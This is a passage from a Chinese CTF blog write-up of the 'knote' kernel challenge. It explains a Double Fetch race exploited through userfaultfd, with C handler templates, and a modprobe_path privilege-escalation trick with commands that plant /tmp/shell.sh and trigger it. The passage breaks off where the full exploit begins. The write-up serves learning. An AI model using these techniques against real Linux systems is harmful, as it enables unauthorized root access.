<li>注册块设备：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">register_blkdev</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">const</span> <span class="keyword">char</span> *)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unregister_blkdev</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">const</span> <span class="keyword">char</span> *)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>然后就会在 <code>/dev</code> 目录中生成一个对应的文件</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/25/Double%20Fetch+modprobe_path%20attack/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/10/25/Double%20Fetch+modprobe_path%20attack/" class="post-title-link" itemprop="url">Double Fetch+modprobe_path attack</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-10-25 20:08:24 / Modified: 20:10:50" itemprop="dateCreated datePublished" datetime="2022-10-25T20:08:24+08:00">2022-10-25</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>15k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>13 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>knote 复现</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">cd /home/ctf</span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 64M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./rootfs.img \</span><br><span class="line">-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 kaslr&quot; \</span><br><span class="line">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">-nographic \</span><br><span class="line">-monitor /dev/null \</span><br><span class="line">-smp cores=2,threads=1 \</span><br><span class="line">-cpu qemu64,+smep,+smap</span><br></pre></td></tr></table></figure>
<ul>
<li>kaslr，smep，smap</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">echo &quot;&#123;==DBG==&#125; INIT SCRIPT&quot;</span><br><span class="line"></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mkdir /dev/pts</span><br><span class="line">mount -t devpts devpts /dev/pts</span><br><span class="line"></span><br><span class="line">mdev -s</span><br><span class="line">exec 0&lt;/dev/console</span><br><span class="line">exec 1&gt;/dev/console</span><br><span class="line">exec 2&gt;/dev/console</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">echo -e &quot;&#123;==DBG==&#125; Boot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds&quot;</span><br><span class="line">insmod note.ko</span><br><span class="line">mknod /dev/knote c 10 233</span><br><span class="line">chmod 666 /dev/knote</span><br><span class="line">chmod 666 /dev/ptmx</span><br><span class="line">chown 0:0 /flag</span><br><span class="line">chmod 400 /flag</span><br><span class="line"></span><br><span class="line">poweroff -d 120 -f &amp;</span><br><span class="line"></span><br><span class="line">chroot . setuidgid 1000 /bin/sh #normal user</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>
<ul>
<li>kptr_restrict，dmesg_restrict</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/ $ cat /proc/version </span><br><span class="line">Linux version <span class="number">5.3</span><span class="number">.6</span> (aris@ubuntu) (gcc version <span class="number">5.4</span><span class="number">.0</span> <span class="number">20160609</span> (Ubuntu <span class="number">5.4</span><span class="number">.0</span><span class="number">-6u</span>b9</span><br></pre></td></tr></table></figure>
<ul>
<li>version 5.3.6（很难 ROP 到用户态）</li>
</ul>
<p><strong>模块分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">note_init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    _fentry__();</span><br><span class="line">    misc_register(&amp;note);</span><br><span class="line">    my_rwlock = <span class="number">0</span>;</span><br><span class="line">    *(&amp;my_rwlock + <span class="number">1</span>) = <span class="number">0</span>;</span><br><span class="line">    printk(<span class="string">&quot;16knote:BOOT SUCCESS!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>在 Linux 系统中，存在一类字符设备，他们共享一个主设备号(10)，但此设备号不同，我们称这类设备为混杂设备</li>
<li><code>misc_device</code> 是特殊的字符设备，注册驱动程序时采用 <code>misc_register</code> 函数注册 </li>
</ul>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 index; <span class="comment">// rax</span></span><br><span class="line">  __int64 buft; <span class="comment">// rdi</span></span><br><span class="line">  chunk *chunk; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  <span class="keyword">if</span> ( LODWORD(myarg.size) &gt; <span class="number">9</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(<span class="string">&quot;13knote:index out of range\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    index = LODWORD(myarg.size);</span><br><span class="line">    buft = buf[index].buf;</span><br><span class="line">    chunk = &amp;buf[index];</span><br><span class="line">    <span class="keyword">if</span> ( buft )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( copy_user_generic_unrolled(buft, myarg.buf, LODWORD(chunk-&gt;size)) )<span class="comment">// 条件竞争</span></span><br><span class="line">        printk(<span class="string">&quot;13knote:copy data failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      printk(<span class="string">&quot;13knote:no such note\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>没有加锁，<code>myarg.buf</code> 为全局变量，有条件竞争漏洞</li>
<li>释放模块有 UAF </li>
</ul>
<p><strong>Double Fetch</strong></p>
<p><code>Double Fetch</code> 从漏洞原理上属于条件竞争漏洞，是一种内核态与用户态之间的数据访问竞争 </p>
<ul>
<li>通常情况下，用户空间向内核传递数据时，内核先通过通过 <code>copy_from_user</code> 等拷贝函数将用户数据拷贝至内核空间进行校验及相关处理</li>
<li>但在输入数据较为复杂时，内核可能只引用其指针，而将数据暂时保存在用户空间进行后续处理</li>
<li>此时，该数据存在被其他恶意线程篡改风险，造成内核验证通过数据与实际使用数据不一致，导致内核代码执行异常</li>
</ul>
<p><img src="/2022/10/25/Double%20Fetch+modprobe_path%20attack/1666523718096.png" alt="1666523718096"> </p>
<ul>
<li>一个用户态线程准备数据并通过系统调用进入内核，该数据在内核中有两次被取用：<ul>
<li>内核第一次取用数据进行安全检查（如缓冲区大小、指针可用性等）</li>
<li>内核第二次取用数据进行实际处理</li>
</ul>
</li>
<li>而在两次取用数据之间，另一个用户态线程可创造条件竞争，对已通过检查的用户态数据进行篡改，在真实使用时造成访问越界或缓冲区溢出，最终导致内核崩溃或权限提升</li>
</ul>
<p><code>Double Fetch</code> 需要使用 userfaultfd 机制：</p>
<ul>
<li>userfaultfd 并不是一种攻击的名字，它是 Linux 提供的一种让用户自己处理缺页异常的机制</li>
<li>初衷是为了提升开发灵活性，后来在 kernel pwn 中常被用于提高条件竞争的成功率</li>
</ul>
<p>现在来看一个详细的例子：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ptr) &#123;  </span><br><span class="line">   ...  </span><br><span class="line">   copy_from_user(ptr,user_buf,len);  </span><br><span class="line">   ...  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>
<ul>
<li>如果，<code>user_buf</code> 是一块 mmap 映射的未初始化区域，此时就会触发缺页错误 <code>copy_from_user</code> 将暂停执行</li>
<li>在暂停的这段时间内，我们开另一个线程，将 ptr 释放掉，再把其他结构申请到这里（比如：<code>tty_struct</code>）</li>
<li>然后当缺页处理结束后，<code>copy_from_user</code> 恢复执行，然而 ptr 此时指向的是 <code>tty_struct</code> 结构，那么就能对 <code>tty_struct</code> 结构进行修改了（当然也可以是其他的结构体）</li>
</ul>
<p>模板如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">userfault</span><span class="params">(<span class="keyword">void</span> *fault_page,<span class="keyword">void</span> *handler)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">pthread_t</span> thr;</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">   <span class="keyword">uint64_t</span> uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">   ua.api = UFFD_API;</span><br><span class="line">   ua.features = <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>)</span><br><span class="line">      errExit(<span class="string">&quot;[-] ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"> </span><br><span class="line">   ur.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)fault_page; </span><br><span class="line">   ur.range.len   = PAGE_SIZE;</span><br><span class="line">   ur.mode        = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">   <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="number">-1</span>) </span><br><span class="line">      errExit(<span class="string">&quot;[-] ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">int</span> s = pthread_create(&amp;thr, <span class="literal">NULL</span>, handler, (<span class="keyword">void</span>*)uffd);</span><br><span class="line">   <span class="keyword">if</span> (s!=<span class="number">0</span>)</span><br><span class="line">      errExit(<span class="string">&quot;[-] pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>处理函数 <code>handler</code> 的模板如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">handler</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">   <span class="keyword">unsigned</span> <span class="keyword">long</span> uffd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)arg;</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;[+] leak_handler created&quot;</span>);</span><br><span class="line">   sleep(<span class="number">3</span>); </span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">   <span class="keyword">int</span> nready;</span><br><span class="line">   pollfd.fd = uffd;</span><br><span class="line">   pollfd.events = POLLIN;</span><br><span class="line"></span><br><span class="line">   nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">   <span class="keyword">if</span> (nready != <span class="number">1</span>)</span><br><span class="line">      errExit(<span class="string">&quot;[-] Wrong pool return value&quot;</span>);</span><br><span class="line">   nready = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">   <span class="keyword">if</span> (nready &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">      errExit(<span class="string">&quot;[-]msg error!!&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">char</span> *page = (<span class="keyword">char</span>*)mmap(<span class="literal">NULL</span>, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">   <span class="keyword">if</span> (page == MAP_FAILED)</span><br><span class="line">      errExit(<span class="string">&quot;[-]mmap page error!!&quot;</span>);</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line"><span class="comment">// memcpy(page,&amp;modprobe_path,8);</span></span><br><span class="line">   uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)page;</span><br><span class="line">   uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)msg.arg.pagefault.address &amp; ~(PAGE_SIZE - <span class="number">1</span>);;</span><br><span class="line">   uc.len = PAGE_SIZE;</span><br><span class="line">   uc.mode = <span class="number">0</span>;</span><br><span class="line">   uc.copy = <span class="number">0</span>;</span><br><span class="line">   ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;[+] leak_handler done!!&quot;</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>Modprobe_path Attack</strong></p>
<p><code>modprobe_path</code> 是用于在 <code>Linux</code> 内核中添加可加载的内核模块，当我们在 <code>Linux</code> 内核中安装或卸载新模块时，就会执行 <code>modprobe_path</code> 指向的程序</p>
<p>他的路径是一个内核全局变量，默认为 <code>/sbin/modprobe</code>，源码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* modprobe_path is set via /proc/sys */</span></span><br><span class="line"><span class="keyword">char</span> modprobe_path[KMOD_PATH_LEN] = <span class="string">&quot;/sbin/modprobe&quot;</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>也可以通过如下命令来查看该值： </li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ cat /proc/sys/kernel/modprobe</span><br><span class="line">/sbin/modprobe</span><br></pre></td></tr></table></figure>
<ul>
<li>其就是 Linux <code>modprobe</code> 命令（在 <code>sbin</code> 目录中，说明该程序拥有 Root 权限）</li>
<li>此外，<code>modprobe_path</code> 在内核中且具有可写权限（普通权限即可修改该值）</li>
</ul>
<p>而当内核运行一个错误格式的文件（或未知文件类型的文件）的时候，内核调用 <code>call_modprobe</code> 函数执行 <code>modprobe_path</code> 指向的文件：</p>
<ul>
<li>由于 <code>call_modprobe</code> 函数拥有 Root 权限</li>
<li>我们只需要劫持 <code>modprobe_path</code>，指向我们提权的脚本，然后 <code>system</code> 一个非法文件，就能触发提权脚本的执行</li>
<li>其调用链如下： （内核版本 linux-4.20.1）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">do_execve() -&gt; do_execveat_common() -&gt; __do_execve_file() -&gt; exec_binprm() -&gt; search_binary_handler() -&gt; request_module() -&gt; call_modprobe() -&gt; call_usermodehelper_exec()</span><br></pre></td></tr></table></figure>
<p>使用案例如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="string">&quot;echo &#x27;#!/bin/sh&#x27; &gt; /tmp/shell.sh&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;echo &#x27;chmod 777 /flag&#x27; &gt;&gt; /tmp/shell.sh&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;chmod +x /tmp/shell.sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;echo -e &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /tmp/fake&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;chmod +x /tmp/fake&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;/tmp/fake&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;cat /flag&quot;</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>假设我们已经把 <code>modprobe_path</code> 修改为了 <code>/tmp/shell.sh</code>（提权脚本）</li>
<li>当程序发现 <code>/tmp/fake</code> 不可执行时，就会通过 <code>call_modprobe</code> 来调用 <code>modprobe_path</code> 所指向的命令</li>
<li>然后执行 <code>/tmp/shell.sh</code> 完成提权</li>
</ul>
<p><strong>Slab Heap</strong></p>
<p>Linux 内核使用的是 slab/slub 分配器，以内存池的形式分配内存（大小相同的堆靠在一起，8K的内存池专门管理8K的堆空间，16字节的内存池专门管理16字节的堆空间），使用如下命令可以查看 slab 内存池：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ sudo cat /proc/slabinfo     </span><br><span class="line">slabinfo - version: 2.1</span><br><span class="line">......</span><br><span class="line">kmalloc-rcl-8k         0      0   8192    4    8 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">kmalloc-rcl-4k         0      0   4096    8    8 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">kmalloc-rcl-2k         0      0   2048   16    8 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">kmalloc-rcl-1k         0      0   1024   16    4 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">kmalloc-rcl-512        0      0    512   16    2 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">kmalloc-rcl-256        0      0    256   16    1 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">kmalloc-rcl-192        0      0    192   21    1 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">kmalloc-rcl-128     1184   1184    128   32    1 : tunables    0    0    0 : slabdata     37     37      0</span><br><span class="line">kmalloc-rcl-96      1848   1848     96   42    1 : tunables    0    0    0 : slabdata     44     44      0</span><br><span class="line">kmalloc-rcl-64      3392   3392     64   64    1 : tunables    0    0    0 : slabdata     53     53      0</span><br><span class="line">kmalloc-rcl-32         0      0     32  128    1 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">kmalloc-rcl-16         0      0     16  256    1 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">kmalloc-rcl-8          0      0      8  512    1 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">kmalloc-cg-8k         16     16   8192    4    8 : tunables    0    0    0 : slabdata      4      4      0</span><br><span class="line">kmalloc-cg-4k         59     96   4096    8    8 : tunables    0    0    0 : slabdata     12     12      0</span><br><span class="line">kmalloc-cg-2k        160    160   2048   16    8 : tunables    0    0    0 : slabdata     10     10      0</span><br><span class="line">kmalloc-cg-1k        429    528   1024   16    4 : tunables    0    0    0 : slabdata     33     33      0</span><br><span class="line">kmalloc-cg-512       276    320    512   16    2 : tunables    0    0    0 : slabdata     20     20      0</span><br><span class="line">kmalloc-cg-256       144    144    256   16    1 : tunables    0    0    0 : slabdata      9      9      0</span><br><span class="line">kmalloc-cg-192       273    273    192   21    1 : tunables    0    0    0 : slabdata     13     13      0</span><br><span class="line">kmalloc-cg-128       128    128    128   32    1 : tunables    0    0    0 : slabdata      4      4      0</span><br><span class="line">kmalloc-cg-96        168    168     96   42    1 : tunables    0    0    0 : slabdata      4      4      0</span><br><span class="line">kmalloc-cg-64       2368   2368     64   64    1 : tunables    0    0    0 : slabdata     37     37      0</span><br><span class="line">kmalloc-cg-32        512    512     32  128    1 : tunables    0    0    0 : slabdata      4      4      0</span><br><span class="line">kmalloc-cg-16       3072   3072     16  256    1 : tunables    0    0    0 : slabdata     12     12      0</span><br><span class="line">kmalloc-cg-8        2560   2560      8  512    1 : tunables    0    0    0 : slabdata      5      5      0</span><br><span class="line">kmalloc-8k           172    176   8192    4    8 : tunables    0    0    0 : slabdata     44     44      0</span><br><span class="line">kmalloc-4k          1750   1792   4096    8    8 : tunables    0    0    0 : slabdata    224    224      0</span><br><span class="line">kmalloc-2k          2100   2176   2048   16    8 : tunables    0    0    0 : slabdata    136    136      0</span><br><span class="line">kmalloc-1k          2437   2496   1024   16    4 : tunables    0    0    0 : slabdata    156    156      0</span><br><span class="line">kmalloc-512        44028  44848    512   16    2 : tunables    0    0    0 : slabdata   2803   2803      0</span><br><span class="line">kmalloc-256         6090   6096    256   16    1 : tunables    0    0    0 : slabdata    381    381      0</span><br><span class="line">kmalloc-192         9331   9828    192   21    1 : tunables    0    0    0 : slabdata    468    468      0</span><br><span class="line">kmalloc-128         4949   4992    128   32    1 : tunables    0    0    0 : slabdata    156    156      0</span><br><span class="line">kmalloc-96          3060   3402     96   42    1 : tunables    0    0    0 : slabdata     81     81      0</span><br><span class="line">kmalloc-64         16395  16448     64   64    1 : tunables    0    0    0 : slabdata    257    257      0</span><br><span class="line">kmalloc-32         32128  32128     32  128    1 : tunables    0    0    0 : slabdata    251    251      0</span><br><span class="line">kmalloc-16         15104  15104     16  256    1 : tunables    0    0    0 : slabdata     59     59      0</span><br><span class="line">kmalloc-8          12800  12800      8  512    1 : tunables    0    0    0 : slabdata     25     25      0</span><br><span class="line">kmem_cache_node      384    384     64   64    1 : tunables    0    0    0 : slabdata      6      6      0</span><br><span class="line">kmem_cache           208    208    256   16    1 : tunables    0    0    0 : slabdata     13     13      0</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<p>slab 为了提高效率实现了一个机制：</p>
<ul>
<li>在 <code>kfree</code> 后，原用户数据区的前8字节会有指向下一个空闲块的指针 next</li>
<li>如果用户 <code>malloc</code> 的大小在空闲的堆块里有满足要求的，则直接取出</li>
</ul>
<p>有一个比较容易利用的就是，伪造空闲块的 next 指针，则可以很容易分配到我们想要读写的地方（不像 ptmalloc2 还需要伪造堆结构，这里只需要更改 next 指针即可）</p>
<p><strong>入侵思路</strong></p>
<p>利用 <code>Double Fetch</code> 可以在内核全局变量中写入一个 <code>tty_struct</code></p>
<p>但是 5.0 版本以上的内核很难 ROP 到用户态（通过修改 <code>tty_struct-&gt;tty_operations</code> 为 gadget，ROP 到用户态的办法失效了）</p>
<p>此时需要另一个入侵技巧 <code>modprobe_path attack</code>，通过伪造空闲堆的 next 指针，实现任意地址处分配，把 <code>modprobe_path</code> 分配到可控区域，然后进行修改</p>
<p>最后就是 <code>modprobe_path attack</code> 的攻击流程了</p>
<p>完整 exp：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span 